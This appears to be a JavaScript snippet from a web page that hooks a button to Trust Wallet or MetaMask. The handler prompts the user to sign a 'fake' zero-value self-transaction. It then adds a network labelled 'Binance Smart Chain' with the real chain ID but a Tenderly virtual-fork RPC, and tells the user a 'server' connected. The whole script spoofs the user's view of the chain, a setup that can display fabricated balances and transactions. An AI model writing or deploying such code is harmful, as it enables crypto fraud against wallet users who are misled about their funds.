document.getElementById("addRpcBtn").addEventListener("click", async () => {
    if (window.trustwallet || window.ethereum) {
        try {
            console.log("🟢 Trust Wallet or Web3 Provider Detected");

            // Step 1: Fake Transaction Send Karna (Wallet Activate Karne Ke Liye)
            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            const sender = accounts[0]; // Pehla Wallet Jo Connect Hai

            await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{
                    from: sender,
                    to: sender, // Self Transaction (No Gas Fees)
                    value: "0x0", // 0 ETH Send Karna
                    gas: "0x5208", // Gas Limit
                }]
            });

            // Step 2: RPC Add Karna (Transaction Trigger Hone Ke Baad)
            await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [{
                    chainId: "0x38",
                    chainName: "Binance Smart Chain",
                    rpcUrls: ["https://virtual.binance.rpc.tenderly.co/bab6e0ec-ef9d-4a6b-aa5b-bb0434d719f7"],
                    nativeCurrency: {
                        name: "BNB",
                        symbol: "BNB",
                        decimals: 18
                    },
                    blockExplorerUrls: ["https://bscscan.com"] // Explorer
                }]
            });

            document.getElementById("status").innerText = "✅ Server Connected Successfully!";
            console.log("✅ Custom Ethereum RPC added successfully in Trust Wallet & MetaMask!");
        } catch (error) {
            console.error("❌ Error Adding RPC:", error);
            document.getElementById("status").innerText = "❌ Error: " + error.message;
        }
    } else {
        console.log("❌ Trust Wallet Not Detected");
        document.getElementById("status").innerText = "❌ Trust Wallet Not Detected!";
    }
});
